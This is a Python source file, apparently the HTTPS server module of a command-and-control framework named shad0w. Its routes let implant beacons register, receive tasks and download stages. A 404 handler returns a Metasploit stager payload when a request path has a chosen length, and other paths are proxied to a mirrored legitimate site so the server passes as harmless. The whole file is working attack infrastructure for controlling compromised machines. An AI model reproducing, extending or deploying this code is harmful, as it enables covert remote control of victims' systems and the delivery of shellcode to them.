import sys
import logging
import mimetypes

from lib import mirror, buildtools
from .path_handler import Handler

from OpenSSL import SSL
from flask import Flask, request, jsonify, Response

app = Flask(__name__)

# shut flask output up
log = logging.getLogger('werkzeug')
log.disabled = True
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None

IGNORE_CONTENT = ""


@app.before_request
def log_request():
    # this will show every request that the flask server gets

    shad0w.debug.log(request)

    # do nothing just return
    return None


@app.route("/")
def web_blank_page():
    # this page should never be hit by a legit beacon, so if it is then its not a beacon.
    # either return a blank page or a mirrored page depending on what the user has set.
    shad0w.debug.log("HTTP - '/' was hit")

    if shad0w.mirror is None:
        return phandle.blank_page()

    elif shad0w.mirror is not None:
        return shad0w.page_data


@app.route("/register", methods=["GET", "POST"])
def web_register_beacon():
    # register the beacon

    shad0w.debug.log("HTTP - '/register' was hit, attempting to register")

    # just give it the request so it can pull stuff out itself
    return phandle.register_beacon(request)


@app.route("/tasks", methods=["GET", "POST"])
def web_task_beacon():
    # register a task on a beacon

    return phandle.task_beacon(request)


@app.route("/stage", methods=["GET", "POST"])
def web_stage_beacon():
    # send the requested stage to a beacon

    return phandle.stage_beacon(request)


@app.errorhandler(404)
def not_found(e):

    req_path_len = len(request.path)

    # check if it is a msf stager
    try:
        if req_path_len == int(shad0w.variables["MsfUriSize"]):
            shad0w.debug.log(f"MSF callback...", log=True, new=True)
            return shad0w.payloads["x64_secure_static_srdi"]["bin"]
    except ValueError:
        shad0w.debug.error(f"Value Error: {shad0w.variables['MsfUriSize']}")

    try:
        for obj in shad0w.beacons[shad0w.current_beacon]["serve"]:
            if obj == request.path:
                return shad0w.beacons[shad0w.current_beacon]["serve"][obj]
    except:
        pass

    if shad0w.mirror is None:
        return ""

    path = shad0w.mirror + request.path
    shad0w.debug.log(f"proxying call to {path}")

    data, headers, status_code = mirror.mirror_site(shad0w, path, dynamic=True, method=request.method, headers=request.headers,
                                                    data=request.get_data(), cookies=request.cookies)

    return Response(data, status_code, headers)


def run_serv(*args):
    # cant think of a better way doing this so guess i gotta use globals
    global shad0w, phandle
    shad0w = args[0]

    phandle = Handler(shad0w)

    shad0w.debug.log("Starting flask HTTP server")
    shad0w.debug.log(f"Starting HTTPS server ({shad0w.addr[0]}:{shad0w.addr[1]})", log=True)

    shad0w.debug.log(f"Creating SSL context with {shad0w.sslkey} & {shad0w.sslcrt}")

    try:
        app.run(host=shad0w.addr[0], port=shad0w.addr[1], ssl_context=(shad0w.sslcrt, shad0w.sslkey))
    except FileNotFoundError:
        shad0w.debug.error(f"Unable to find cert: {shad0w.sslcrt} or private key: {shad0w.sslkey}. You should exit.")
        return
